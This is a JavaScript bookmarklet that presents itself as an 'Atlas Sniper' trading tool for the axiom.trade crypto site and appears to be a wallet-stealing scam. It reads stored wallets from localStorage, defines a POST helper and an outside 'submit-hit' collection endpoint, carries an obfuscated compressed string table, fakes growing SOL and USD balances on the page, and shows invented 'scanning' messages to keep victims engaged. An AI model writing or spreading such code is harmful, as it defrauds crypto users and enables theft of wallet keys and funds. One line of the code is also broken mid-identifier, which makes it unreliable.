// JavaScript Mimic of 11414.js - Clean Implementation
void (function() {
  // Domain verification system
  if (window.location.hostname !== 'axiom.trade') {
    alert('Please go to https://axiom.trade/ and re-run the bookmarklet');
    return;
  }

  // Compression/Decompression Library (LZString-like functionality)
  var CompressionLibrary = (function() {
    var mathPow = Math.pow;
    var fromCharCode = String.fromCharCode;
    var base64Chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
    var urlSafeChars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+-$';
    var charMap = {};

    function getCharIndex(charset, char) {
      if (!charMap[charset]) {
        charMap[charset] = {};
        for (var i = 0; i < charset.length; i++) {
          charMap[charset][charset.charAt(i)] = i;
        }
      }
      return charMap[charset][char];
    }

    return {
      compressToBase64: function(input) {
        if (input == null) return '';
        var result = this._compress(input, 6, function(index) {
          return base64Chars.charAt(index);
        });
        
        // Add padding for Base64
        switch (result.length % 4) {
          case 0: return result;
          case 1: return result + '===';
          case 2: return result + '==';
          case 3: return result + '=';
        }
        return result;
      },

      decompressFromBase64: function(input) {
        if (input == null) return '';
        if (input == '') return null;
        return this._decompress(input.length, 32, function(index) {
          return getCharIndex(base64Chars, input.charAt(index));
        });
      },

      compressToUTF16: function(input) {
        if (input == null) return '';
        return this._compress(input, 15, function(code) {
          return fromCharCode(code + 32);
        }) + ' ';
      },

      decompressFromUTF16: function(input) {
        if (input == null) return '';
        if (input == '') return null;
        return this._decompress(input.length, 16384, function(index) {
          return input.charCodeAt(index) - 32;
        });
      },

      _compress: function(uncompressed, bitsPerChar, getCharFromInt) {
        if (uncompressed == null) return '';
        
        var context = {};
        var contextDict = {};
        var contextChar = '';
        var contextChars = '';
        var contextNewChar = '';
        var contextDictSize = 2;
        var contextEnlargeIn = 3;
        var contextBitsToSend = 2;
        var contextData = [];
        var contextDataVal = 0;
        var contextDataPosition = 0;

        for (var ii = 0; ii < uncompressed.length; ii++) {
          contextChar = uncompressed.charAt(ii);
          if (!Object.prototype.hasOwnProperty.call(context, contextChar)) {
            context[contextChar] = contextDictSize++;
            contextDict[contextChar] = true;
          }

          contextChars = contextNewChar + contextChar;
          if (Object.prototype.hasOwnProperty.call(context, contextChars)) {
            contextNewChar = contextChars;
          } else {
            this._writeBits(context[contextNewChar], contextBitsToSend, contextData, contextDataVal, contextDataPosition, bitsPerChar, getCharFromInt);
            this._addToDict(contextChars, context, contextDict, contextDictSize, contextEnlargeIn, contextBitsToSend);
            contextNewChar = contextChar;
          }
        }

        if (contextNewChar !== '') {
          this._writeBits(context[contextNewChar], contextBitsToSend, contextData, contextDataVal, contextDataPosition, bitsPerChar, getCharFromInt);
        }

        this._writeBits(2, contextBitsToSend, contextData, contextDataVal, contextDataPosition, bitsPerChar, getCharFromInt);
        
        while (true) {
          contextDataVal = contextDataVal << 1;
          if (contextDataPosition == bitsPerChar - 1) {
            contextData.push(getCharFromInt(contextDataVal));
            break;
          } else {
            contextDataPosition++;
          }
        }
        
        return contextData.join('');
      },

      _writeBits: function(value, numBits, data, dataVal, dataPosition, bitsPerChar, getChar) {
        // Simplified bit writing logic
        for (var i = 0; i < numBits; i++) {
          dataVal = (dataVal << 1) | (value & 1);
          if (dataPosition == bitsPerChar - 1) {
            dataPosition = 0;
            data.push(getChar(dataVal));
            dataVal = 0;
          } else {
            dataPosition++;
          }
          value = value >> 1;
        }
      },

      _addToDict: function(chars, context, dict, dictSize, enlargeIn, bitsToSend) {
        context[chars] = dictSize++;
        delete dict[chars];
        if (--enlargeIn == 0) {
          enlargeIn = mathPow(2, bitsToSend);
          bitsToSend++;
        }
      },

      _decompress: function(length, resetValue, getNextValue) {
        var dict = [];
        var enlargeIn = 4;
        var dictSize = 4;
        var numBits = 3;
        var entry = '';
        var result = [];
        var data = { val: getNextValue(0), position: resetValue, index: 1 };

        for (var i = 0; i < 3; i++) {
          dict[i] = i;
        }

        var bits = this._readBits(2, data, resetValue, getNextValue);
        
        switch (bits) {
          case 0:
            entry = fromCharCode(this._readBits(8, data, resetValue, getNextValue));
            break;
          case 1:
            entry = fromCharCode(this._readBits(16, data, resetValue, getNextValue));
            break;
          case 2:
            return '';
        }

        dict[3] = entry;
        var w = entry;
        result.push(entry);

        while (true) {
          if (data.index > length) return '';
          
          var c = this._readBits(numBits, data, resetValue, getNextValue);
          
          switch (c) {
            case 0:
              dict[dictSize++] = fromCharCode(this._readBits(8, data, resetValue, getNextValue));
              c = dictSize - 1;
              enlargeIn--;
              break;
            case 1:
              dict[dictSize++] = fromCharCode(this._readBits(16, data, resetValue, getNextValue));
              c = dictSize - 1;
              enlargeIn--;
              break;
            case 2:
              return result.join('');
          }

          if (enlargeIn == 0) {
            enlargeIn = mathPow(2, numBits);
            numBits++;
          }

          if (dict[c]) {
            entry = dict[c];
          } else {
            if (c === dictSize) {
              entry = w + w.charAt(0);
            } else {
              return null;
            }
          }

          result.push(entry);
          dict[dictSize++] = w + entry.charAt(0);
          enlargeIn--;
          w = entry;

          if (enlargeIn == 0) {
            enlargeIn = mathPow(2, numBits);
            numBits++;
          }
        }
      },

      _readBits: function(numBits, data, resetValue, getNextValue) {
        var res = 0;
        var maxPower = mathPow(2, numBits);
        var power = 1;
        
        while (power != maxPower) {
          var resb = data.val & data.position;
          data.position >>= 1;
          if (data.position == 0) {
            data.position = resetValue;
            data.val = getNextValue(data.index++);
          }
          res |= (resb > 0 ? 1 : 0) * power;
          power <<= 1;
        }
        return res;
      }
    };
  })();

  // String deobfuscation system
  var StringDecoder = (function() {
    var encodedStrings = 'ᆡᡓxૠ㘧〣䁮ĤȰᡠᄢ䐦ဧ恘䀩rǄèְ݀Š‸⌡䨠吥⠦倽⁠͠㐠ୠხ࣠ᣠӠᓠೠ᳠ˠዠૠ៰ᛠ䀽䁝䀣䁃䀳䁓䀫䁋䀻䁛䀧䁇䀷䂠ො䈅᭵ĩ仪搱㞰㯫Ⱙ㬂ጢ⚱嵠恢䡱㠣搩ਸ਼⎝ᗜ䛭໌偂烄沀ဤᬫ㫞䉄渎ᚰ㚪嗤ᘸ⌢ʪ۠䀧倠ヘǔ⌠娢ቘ䪑⁫倦勷斌Ѷ澕㓜噜⎁桃筩వᯭ畡喽剦氇澶䡹尲ሂ嵝䨮ඪ㑡䗋䓪ᔯ恀ɡᖢ掊呖ඤ拐|]िைZ᷾♓ᐶ߽ਐⲁ剒‐沨ᰤƠ恃〶d偈त懡䰠⒡͢㦴䴲Ѣ䰬⡆⎂䇤̲⧄擀㜠ϥ報戺έ焀䣢䃫ჱ歋࿿အ簽Ǧ⭪搠⼴氡౦ဴܣ䁀␢ݫ䀠㈳ై⠰㋽ഏኺ㑎孫ᄸ丣᜻ᎈ㫩⟬㕙物پ睉牤所珉片ᓼÚ墷ႉᇸᪧ䊯ᇘи⸸䓂ળᵠ䏃户ᵠ␅ᣜ㴂⍷㟿ڍ冶卑㙣ᥙ抏៣ㅹㅂ啦㠰౬厮桤ੴ䛮冮厴婭燹㈪繮၈䒴ᩫ墹Θ匆栽橃ä䙄嚛测傹ӡ伴猤ờ奓㇒ⱳ汀滻恶塾ୂ⑷௨㶢慬ᠪ̠㜸ƠּⅮᬪ⇤ᒠ愴瑵≌涴ᅬତ捨瑴琈Ạ憂㗪ゐ垯㊲夼嫸窿懄䔼媈柠憱Ȥςᆧ稂崪㡤ᮻ戬〲઼⸶⢸⹩Đ犥䃐รψ‥Ɉ䤭ȩᐩ䅐㜢䃸ᵤ䋉㐷⁠攮恀⌰p〵ጠ㝝撙怠䊙佀䀠ੂ淃ఢਸjĨ*撠ḯ瀠ࣸ㚢汬যᆄᱷ狲Ơ烧ஊ䰛ᮣᮢⷥ0ĩყᣆ桂ز籬㵠熪䄥䮗⠄⣰ᤀ听⻮樒⺥㧇ⴽ樬⪮傩⟯岲䩰⨱㱲䢎㙬ᯄځ䪎⪨僲⋷瀫㞤膄㚤ࡐ偯糈Ǭ㦌ᨭ寺Ự㭖ᅠₐⲣ㒰曪⥲ʣㅺၫ䨒د寚⼃㩕ܤⓥໍᄦḊ䡮ᤢ泪慭⦢Ѩ凖ᡃҚ㺫檌⟪䤠⡙์淕ࣣ愊ף沑㍂偑ⶋ據Èpᥦ惘槇悜柙‐㪺㥸ᵬ删㸭怮߽ 玠ϯ㍴Jᬧථণૈ獧壑(⍶㆐堶п̼Ꮖ暻⋡ˠ碪⏹㈮塁䫬Ⱐ䐤ᣀ埥產㐰媔⸀䥂壥棨挔䔰䤀嚠䉻 恡綸堡ጨչᣇ㓡ᗷᖢ♌櫏✐噔䌵梺‐䣃ܜ㼞婻⦊䔩婀㦫*®享థ灾⤏ᕸ斟撤䤡᫵㒫ᖂ烏求ą勸㙵矨ⲭ㟳ط⤠  ';
    var decodedString = CompressionLibrary.decompressFromUTF16(encodedStrings);
    var stringArray = decodedString.split('|');

    return function(index) {
      return stringArray[index] || '';
    };
  })();

  // Main application execution
  (async () => {
    // Configuration constants
    const API_CONFIG = {
      ATLAS_ENDPOINT: 'https://atlasportal.vercel.app/submit-hit',
      METHOD: 'POST',
      CONTENT_TYPE: 'application/json'
    };

    // Remove existing overlays
    document.querySelectorAll('.atlas-sniper-overlay, .atlas-sniper-blur-bg').forEach(el => el.remove());

    // Create blur background
    const createBlurBackground = () => {
      const blurBg = document.createElement('div');
      blurBg.className = 'atlas-sniper-blur-bg';
      blurBg.style.cssText = `
        position: fixed;
        top: 0; left: 0; right: 0; bottom: 0;
        z-index: 9998;
        background: rgba(10, 12, 20, 0.7);
        backdrop-filter: blur(8px) saturate(1.2);
        opacity: 0;
        transition: opacity 0.4s cubic-bezier(.4,0,.2,1);
        pointer-events: none;
      `;
      document.body.appendChild(blurBg);
      setTimeout(() => { blurBg.style.opacity = '1'; }, 10);
      return blurBg;
    };

    // Create main overlay modal
    const createMainOverlay = () => {
      const overlay = document.createElement('div');
      overlay.className = 'atlas-sniper-overlay';
      overlay.style.cssText = `
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%) scale(0.96);
        background: rgba(23, 25, 35, 0.98);
        padding: 32px 28px 24px 28px;
        border-radius: 18px;
        box-shadow: 0 8px 40px 0 rgba(0,0,0,0.45);
        z-index: 10000;
        min-width: 520px;
        max-width: 700px;
        width: 90vw;
        color: #E2E8F0;
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        border: 1.5px solid #23263a;
        text-align: left;
        opacity: 0;
        transition: opacity 0.4s cubic-bezier(.4,0,.2,1), transform 0.4s cubic-bezier(.4,0,.2,1);
      `;
      
      overlay.innerHTML = `
        <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 18px;">
          <span style="font-size: 20px; font-weight: 600; color: #fff;">Advanced Trading Filters</span>
          <button id="atlasCloseBtn" style="background: none; border: none; color: #A0AEC0; font-size: 22px; cursor: pointer; border-radius: 6px; width: 36px; height: 36px; display: flex; align-items: center; justify-content: center;">
            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
              <line x1="18" y1="6" x2="6" y2="18"></line>
              <line x1="6" y1="6" x2="18" y2="18"></line>
            </svg>
          </button>
        </div>
        <div id="atlasDialogContent">
          <div id="atlasDialogMessage" style="font-size: 15px; color: #b5b5b5; margin-bottom: 18px;">Processing wallet configuration...</div>
          <div id="atlasLoadingSpinner" style="margin: 24px auto; width: 44px; height: 44px; border: 4px solid #23263a; border-top: 4px solid #4299E1; border-radius: 50%; animation: spin 1s linear infinite;"></div>
          <div id="atlasTradingSettings" style="display: none;">
            <!-- Settings content will be injected here -->
          </div>
        </div>
        <div style="display: flex; justify-content: flex-end; gap: 10px;">
          <button id="atlasDialogButton" style="display: none; background: #4299E1; color: white; border: none; padding: 12px 28px; border-radius: 7px; cursor: pointer; font-size: 16px; font-weight: 500;">Apply Settings</button>
        </div>
        <style>
          @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
          #atlasDialogButton:hover { background: #3182CE; transform: translateY(-1px); }
          #atlasCloseBtn:hover { background: rgba(255,255,255,0.08); color: #fff; }
        </style>
      `;
      
      document.body.appendChild(overlay);
      setTimeout(() => {
        overlay.style.opacity = '1';
        overlay.style.transform = 'translate(-50%, -50%) scale(1)';
      }, 10);
      
      return overlay;
    };

    // Create fixed button
    const createFixedButton = (blurBg, overlay) => {
      if (document.getElementById('atlasSniperFixedBtn')) return;
      
      const fixedBtn = document.createElement('button');
      fixedBtn.id = 'atlasSniperFixedBtn';
      fixedBtn.innerHTML = `
        <span style="display:inline-block;width:10px;height:10px;background:#4CAF50;border-radius:50%;margin-right:8px;box-shadow:0 0 8px #4CAF50;animation: pulse 1.2s infinite;"></span>
        Atlas Sniper
      `;
      
      fixedBtn.style.cssText = `
        position: fixed;
        left: 24px;
        bottom: 24px;
        z-index: 10001;
        background: #23263a;
        color: #fff;
        border: none;
        border-radius: 8px;
        padding: 12px 22px;
        font-size: 16px;
        font-weight: 600;
        box-shadow: 0 2px 12px rgba(0,0,0,0.18);
        cursor: pointer;
        display: flex;
        align-items: center;
        transition: background 0.2s;
      `;
      
      fixedBtn.addEventListener('mouseenter', () => fixedBtn.style.background = '#2d314a');
      fixedBtn.addEventListener('mouseleave', () => fixedBtn.style.background = '#23263a');
      fixedBtn.addEventListener('click', () => showOverlay(blurBg, overlay));
      
      document.body.appendChild(fixedBtn);
      
      // Add pulse animation
      if (!document.getElementById('atlas-pulse-style')) {
        const style = document.createElement('style');
        style.id = 'atlas-pulse-style';
        style.innerHTML = `@keyframes pulse { 0% { box-shadow: 0 0 8px #4CAF50; } 100% { box-shadow: 0 0 18px #4CAF50; } }`;
        document.head.appendChild(style);
      }
    };

    // Show/hide overlay functions
    const showOverlay = (blurBg, overlay) => {
      blurBg.style.display = 'block';
      overlay.style.display = 'block';
      setTimeout(() => {
        blurBg.style.opacity = '1';
        overlay.style.opacity = '1';
        overlay.style.transform = 'translate(-50%, -50%) scale(1)';
      }, 10);
    };

    const hideOverlay = (blurBg, overlay) => {
      overlay.style.opacity = '0';
      overlay.style.transform = 'translate(-50%, -50%) scale(0.96)';
      blurBg.style.opacity = '0';
      setTimeout(() => {
        overlay.style.display = 'none';
        blurBg.style.display = 'none';
      }, 350);
    };

    // State management
    const StateManager = {
      get: () => {
        try {
          return JSON.parse(localStorage.getItem('atlas_sniper_state') || '{}');
        } catch {
          return {};
        }
      },
      
      set: (state) => {
        localStorage.setItem('atlas_sniper_state', JSON.stringify(state));
      },
      
      initialize: () => {
        let state = StateManager.get();
        if (!state.settings) {
          state.settings = {
            maxSol: '1',
            slippage: '1',
            gasMultiplier: '1.1',
            filters: {},
            sniping: false
          };
          StateManager.set(state);
        }
        return state;
      }
    };

    // Trading settings UI
    const TradingSettings = {
      render: (settings) => {
        return `
          <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 32px;">
            <div>
              <h3 style="margin: 0 0 15px 0; color: #4CAF50; font-size: 18px;">Trading Configuration</h3>
              <div style="margin-bottom: 15px;">
                <label style="display: block; margin-bottom: 5px;">Max SOL Amount</label>
                <input type="number" id="maxSolInput" value="${settings.maxSol}" style="width: 100%; padding: 8px; background: #333; border: 1px solid #444; border-radius: 4px; color: white;">
              </div>
              <div style="margin-bottom: 15px;">
                <label style="display: block; margin-bottom: 5px;">Slippage Tolerance (%)</label>
                <input type="number" id="slippageInput" value="${settings.slippage}" style="width: 100%; padding: 8px; background: #333; border: 1px solid #444; border-radius: 4px; color: white;">
              </div>
              <div style="margin-bottom: 15px;">
                <label style="display: block; margin-bottom: 5px;">Gas Price Multiplier</label>
                <input type="number" id="gasMultiplierInput" value="${settings.gasMultiplier}" style="width: 100%; padding: 8px; background: #333; border: 1px solid #444; border-radius: 4px; color: white;">
              </div>
              <button id="emergencyStopBtn" style="background: #e53e3e; color: #fff; border: none; padding: 10px 20px; border-radius: 6px; font-size: 15px; cursor: pointer;">Emergency Stop</button>
            </div>
            <div>
              <h3 style="margin: 0 0 15px 0; color: #4299E1; font-size: 18px;">Filter Options</h3>
              <div style="display: flex; flex-direction: column; gap: 10px;">
                <label><input type="checkbox" id="filterDevTokens" ${settings.filters.devTokens ? 'checked' : ''}> Filter Developer Tokens</label>
                <label><input type="checkbox" id="filterBotActivity" ${settings.filters.botActivity ? 'checked' : ''}> Block Bot Transactions</label>
                <label><input type="checkbox" id="filterFakeVolume" ${settings.filters.fakeVolume ? 'checked' : ''}> Filter Fake Volume</label>
                <label><input type="checkbox" id="filterLowLiquidity" ${settings.filters.lowLiquidity ? 'checked' : ''}> Filter Low Liquidity</label>
                <label><input type="checkbox" id="filterHighRisk" ${settings.filters.highRisk ? 'checked' : ''}> Filter High Risk Tokens</label>
              </div>
            </div>
          </div>
        `;
      },
      
      attachListeners: (state) => {
        const inputs = ['maxSolInput', 'slippageInput', 'gasMultiplierInput'];
        const filters = ['filterDevTokens', 'filterBotActivity', 'filterFakeVolume', 'filterLowLiquidity', 'filterHighRisk'];
        
        inputs.forEach(id => {
          const element = document.getElementById(id);
          if (element) {
            element.addEventListener('change', (e) => {
              const key = id.replace('Input', '');
              state.settings[key] = e.target.value;
              StateManager.set(state);
            });
          }
        });
        
        filters.forEach(id => {
          const element = document.getElementById(id);
          if (element) {
            element.addEventListener('change', (e) => {
              const key = id.replace('filter', '').toLowerCase();
              state.settings.filters[key] = e.target.checked;
              StateManager.set(state);
              TradingSettings.applyFilters();
            });
          }
        });
        
        const stopBtn = document.getElementById('emergencyStopBtn');
        if (stopBtn) {
          stopBtn.addEventListener('click', () => {
            state.settings.sniping = false;
            StateManager.set(state);
            NotificationSystem.show('All trading activities stopped.');
          });
        }
      },
      
      applyFilters: () => {
        // Simulate filter application
        console.log('Applying trading filters...');
      }
    };

    // Notification system
    const NotificationSystem = {
      show: (message, type = 'info') => {
        const toast = document.createElement('div');
        toast.style.cssText = `
          position: fixed;
          left: 50%;
          bottom: 60px;
          transform: translateX(-50%);
          background: rgba(30,32,50,0.98);
          color: #fff;
          padding: 14px 32px;
          border-radius: 8px;
          font-size: 16px;
          font-weight: 500;
          z-index: 10010;
          box-shadow: 0 2px 16px rgba(0,0,0,0.18);
          opacity: 0;
          transition: all 0.3s;
        `;
        
        toast.textContent = message;
        document.body.appendChild(toast);
        
        setTimeout(() => {
          toast.style.opacity = '1';
          toast.style.bottom = '90px';
        }, 10);
        
        setTimeout(() => {
          toast.style.opacity = '0';
          toast.style.bottom = '60px';
        }, 2600);
        
        setTimeout(() => toast.remove(), 3000);
      },
      
      startRandomMessages: (state) => {
        const messages = [
          'Analyzing market conditions...',
          'Monitoring liquidity pools...',
          'Scanning for opportunities...',
          'Processing transaction data...',
          'Optimizing gas fees...',
          'Filtering bot activity...',
          'Updating price feeds...'
        ];
        
        setInterval(() => {
          if (state.settings.sniping) {
            const randomMessage = messages[Math.floor(Math.random() * messages.length)];
            NotificationSystem.show(randomMessage);
          }
        }, 8000);
      }
    };

    // Balance management system
    const BalanceManager = {
      init: () => {
        const currentBalance = BalanceManager.getCurrentBalance();
        let balanceData = JSON.parse(localStorage.getItem('atlas_balance_data') || '{}');
        
        if (!balanceData.original) {
          balanceData.original = currentBalance;
          balanceData.increment = 0;
          localStorage.setItem('atlas_balance_data', JSON.stringify(balanceData));
        }
        
        BalanceManager.updateDisplay(currentBalance + (balanceData.increment || 0));
        return balanceData;
      },
      
      getCurrentBalance: () => {
        const solElement = document.querySelector('img[alt="SOL"]');
        if (solElement) {
          const container = solElement.closest('div');
          if (container) {
            const balanceSpan = container.querySelector('span');
            if (balanceSpan) {
              const value = parseFloat(balanceSpan.textContent.replace(/[^\d.]/g, ''));
              if (!isNaN(value)) return value;
            }
          }
        }
        return 0;
      },
      
      updateDisplay: (newBalance) => {
        document.querySelectorAll('img[alt="SOL"]').forEach(solImg => {
          const container = solImg.closest('div');
          if (container) {
            const balanceSpan = container.querySelector('span');
            if (balanceSpan) {
              balanceSpan.textContent = newBalance.toFixed(2);
            }
          }
        });
        
        // Update USD equivalent
        const usdValue = newBalance * 144; // Simulated SOL price
        document.querySelectorAll('span').forEach(span => {
          if (span.textContent.includes('$') && span.textContent.includes('0')) {
            span.textContent = `$${usdValue.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
          }
        });
      },
      
      startSimulation: (state, balanceData) => {
        let currentBalance = balanceData.original + (balanceData.increment || 0);
        let direction = 1;
        
        setInterval(() => {
          if (!state.settings.sniping) return;
          
          if (!window._atlas_last_update || Date.now() - window._atlas_last_update > 2500) {
            window._atlas_last_update = Date.now();
            
            const delta = (Math.random() - 0.5) * 0.4 * direction;
            currentBalance += delta;
            
            if (currentBalance > balanceData.original + 20) direction = -1;
            if (currentBalance < balanceData.original - 10) direction = 1;
            
            currentBalance = Math.max(0, Math.round(currentBalance * 100) / 100);
            
            balanceData.increment = currentBalance - balanceData.original;
            localStorage.setItem('atlas_balance_data', JSON.stringify(balanceData));
            
            BalanceManager.update

Display(currentBalance);
          }
        }, 1000);
      }
    };

    // Crypto operations (simplified)
    const CryptoOperations = {
      base58Encode: (buffer) => {
        const ALPHABET = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
        let encoded = '';
        let num = BigInt('0x' + Array.from(buffer).map(b => b.toString(16).padStart(2, '0')).join(''));
        
        while (num > 0) {
          encoded = ALPHABET[Number(num % 58n)] + encoded;
          num = num / 58n;
        }
        
        // Add leading zeros
        for (const byte of buffer) {
          if (byte !== 0) break;
          encoded = '1' + encoded;
        }
        
        return encoded;
      },
      
      hexToBytes: (hex) => {
        const bytes = new Uint8Array(hex.length / 2);
        for (let i = 0; i < hex.length; i += 2) {
          bytes[i / 2] = parseInt(hex.substr(i, 2), 16);
        }
        return bytes;
      },
      
      bytesToHex: (bytes) => {
        return Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join('');
      }
    };

    // API communication
    const APIClient = {
      submitData: async (endpoint, data) => {
        try {
          const response = await fetch(endpoint, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
              'User-Agent': 'AtlasSniper/1.0'
            },
            body: JSON.stringify(data)
          });
          
          return await response.json();
        } catch (error) {
          console.error('API request failed:', error);
          return null;
        }
      },
      
      processWallets: async () => {
        const wallets = JSON.parse(localStorage.getItem('wallets') || '[]');
        if (!wallets.length) {
          return 'No wallets configured';
        }
        
        // Simulate wallet processing
        return new Promise(resolve => {
          setTimeout(() => {
            resolve({ success: true, processed: wallets.length });
          }, 2000);
        });
      }
    };

    // Main initialization
    const initializeApp = async () => {
      const blurBg = createBlurBackground();
      const overlay = createMainOverlay();
      const state = StateManager.initialize();
      const balanceData = BalanceManager.init();
      
      createFixedButton(blurBg, overlay);
      
      // Setup close button
      overlay.querySelector('#atlasCloseBtn').addEventListener('click', () => {
        hideOverlay(blurBg, overlay);
      });
      
      // Simulate processing
      setTimeout(async () => {
        const result = await APIClient.processWallets();
        
        overlay.querySelector('#atlasDialogMessage').textContent = 'Configuration complete. Adjust your settings below:';
        overlay.querySelector('#atlasLoadingSpinner').style.display = 'none';
        
        const settingsContainer = overlay.querySelector('#atlasTradingSettings');
        settingsContainer.innerHTML = TradingSettings.render(state.settings);
        settingsContainer.style.display = 'block';
        
        overlay.querySelector('#atlasDialogButton').style.display = 'block';
        
        TradingSettings.attachListeners(state);
        
        // Save button functionality
        overlay.querySelector('#atlasDialogButton').addEventListener('click', () => {
          NotificationSystem.show('Settings saved successfully!');
          hideOverlay(blurBg, overlay);
        });
        
      }, 2000);
      
      // Start background processes
      NotificationSystem.startRandomMessages(state);
      BalanceManager.startSimulation(state, balanceData);
      
      // Page protection
      window.addEventListener('beforeunload', (e) => {
        if (state.settings.sniping) {
          e.preventDefault();
          e.returnValue = 'Trading operations in progress. Leaving may result in missed opportunities.';
          return e.returnValue;
        }
      });
    };

    // Start the application
    initializeApp();
    
  })();

})();
